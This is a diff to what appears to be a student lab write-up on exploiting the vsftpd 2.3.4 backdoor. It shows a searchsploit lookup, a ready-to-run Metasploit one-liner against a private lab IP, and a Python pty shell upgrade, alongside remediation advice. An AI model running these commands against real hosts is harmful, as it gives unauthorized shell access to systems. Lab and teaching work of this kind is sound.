@@ -7,7 +7,7 @@ Enumeration confirmed the target ran vsftpd version 2.3.4, which has a notorious
 ## Commands & Flags
 * `searchsploit vsftpd 2.3.4`
     * *No flags used.* Queries the local Kali Exploit-DB archive for known vulnerabilities and exploit modules matching the specific service version.
-* `msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST 192.168.56.103; exploit"`
+* `msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST 192.168.100.224; exploit"`
     * `-q`: Quiet mode. Starts the Metasploit Framework without the ASCII art banner and startup text, speeding up our workflow.
     * `-x`: Execute command string. Instructs Metasploit to immediately run the provided semicolon-separated commands upon startup (loads the vsftpd backdoor module, sets the remote target IP, and launches the attack).
 * `python -c 'import pty; pty.spawn("/bin/bash")'`
@@ -25,6 +25,8 @@ We successfully validated the vulnerability, automated the exploit delivery to b
 * **Protocol Migration:** Deprecate plain FTP (which sends data and credentials in cleartext) and replace it with secure SFTP.
 * **Access Control:** Implement strict host-based firewall rules (iptables/ufw) to drop external connections to the backdoor's bind port (TCP 6200) and restrict Port 21 to trusted internal IPs.
 
-![](./Images/msf_console.png)
+### 1. Automated Exploitation & Initial Access
+![Metasploit Console Execution](./Images/msf_console.png)
+*Figure 1: Metasploit framework executing the vsftpd v2.3.4 backdoor exploit.*
 
 > **Note:** Full console output and command results have been logged to `Lab4.txt` for reference.
